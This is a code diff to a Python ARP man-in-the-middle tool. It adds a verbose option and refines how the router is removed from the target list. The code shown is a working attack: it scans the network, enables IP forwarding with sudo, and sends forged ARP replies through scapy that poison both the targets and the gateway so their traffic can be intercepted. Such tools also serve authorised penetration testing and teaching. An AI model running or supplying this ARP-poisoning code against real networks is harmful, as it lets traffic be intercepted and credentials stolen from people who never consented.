@@ -33,15 +33,17 @@ B, R, Y, G, M, N = '\33[94m', '\033[91m', '\33[93m', '\033[1;32m', '\033[1;35m',
 
 # Define the class
 class arp_mitm:
-    def __init__(self, target, rtrip, atkopt, timeout=10, pktintr=0.1):
+    def __init__(self, target, rtrip, atkopt, timeout=10, pktintr=0.1, verbose=1):
         # Netscanner/MITM variables
         self.target = target  # Target machine/network
         self.rtrip = rtrip  # Default gateway for the network
         self.atkopt = atkopt  # 0 = Start MITM, 1 = Stop MITM
         self.timeout = timeout  # Response timeout value
         self.pktintr = float(pktintr)  # Interval between packets
+        self.verbose = verbose
         self.rtr_scan = {}
         self.rtrmac = ""
+        self.ip_check = ""
         self.tgt_list_temp = {}
 
         # Linux - IP Forwarding file name
@@ -49,9 +51,10 @@ class arp_mitm:
 
     # Call netscanner to conduct an ARP scan of the target/network and build the target list, get mac addresses from all responses
     def find_targets(self):
-        self.tgt_list = netscan_main.netscanner(1, self.target, timeout=self.timeout, pktintr=self.pktintr, inc_mac=1).init_scan()
-        print("{0}[*] Obtaining Router MAC Address...".format(N))
-        self.rtr_scan = netscan_main.netscanner(1, self.rtrip, timeout=self.timeout, pktintr=self.pktintr, inc_mac=1).init_scan()
+        self.tgt_list = netscan_main.netscanner(1, self.target, timeout=self.timeout, pktintr=self.pktintr, inc_mac=1, verbose=self.verbose).init_scan()
+        if self.verbose == 1:
+            print("{0}[*] Obtaining Router MAC Address...".format(N))
+        self.rtr_scan = netscan_main.netscanner(1, self.rtrip, timeout=self.timeout, pktintr=self.pktintr, inc_mac=1, verbose=self.verbose).init_scan()
 
         if not self.tgt_list:
             print("{0}[*] No targets found via ARP scan. Exiting...".format(R))
@@ -59,9 +62,12 @@ class arp_mitm:
         # Targets found, remove the router from the target list if it responded via ARP. If the router was the only response, then exit the script.
         for key, value in self.tgt_list.items():
             if self.rtrip in value:
-                self.tgt_list.pop(key)
-                print("{0}[*] Router %s removed from target list".format(B) % self.rtrip)
-                break
+                self.ip_check = self.tgt_list[key].split('-')
+                if self.rtrip == self.ip_check[0]:
+                    self.tgt_list.pop(key)
+                    if self.verbose == 1:
+                        print("{0}[*] Router %s removed from target list".format(B) % self.rtrip)
+                    break
         if len(self.tgt_list) == 0:
             print("{0}[*] No valid targets remaining. Exiting...".format(R))
             return False
@@ -82,9 +88,10 @@ class arp_mitm:
             self.stop_arp_mitm()
 
     def start_arp_mitm(self):
-        print("{0}[*] Starting ARP MITM attack...".format(N))
-        print("{0}[*] Turn on IP Forwarding in {1}...".format(N, self.ipforward_file))
-        print("{0}[*] Use Wireshark or a similar network analysis tool to monitor the traffic.".format(Y))
+        if self.verbose == 1:
+         print("{0}[*] Starting ARP MITM attack...".format(N))
+         print("{0}[*] Turn on IP Forwarding in {1}...".format(N, self.ipforward_file))
+         print("{0}[*] Use Wireshark or a similar network analysis tool to monitor the traffic.".format(Y))
         os.popen("sudo echo '1' > {0}".format(self.ipforward_file))
         try:
             for i in self.tgt_list:
@@ -92,7 +99,8 @@ class arp_mitm:
                 send(ARP(op=2, pdst=result[0], psrc=self.rtrip, hwdst=result[1]), count=1, verbose=0)
                 send(ARP(op=2, pdst=self.rtrip, psrc=result[0], hwdst=self.rtrmac), count=1, verbose=0)
                 time.sleep(5)
-                print("{0}[*] Target %s with MAC Address %s poisoned".format(G) % (result[0], result[1]))
+                if self.verbose == 1:
+                    print("{0}[*] Target %s with MAC Address %s poisoned".format(G) % (result[0], result[1]))
         except KeyboardInterrupt:
             print("{0}[*] ARP MITM Attack stopped by user.".format(R))
             self.stop_arp_mitm()
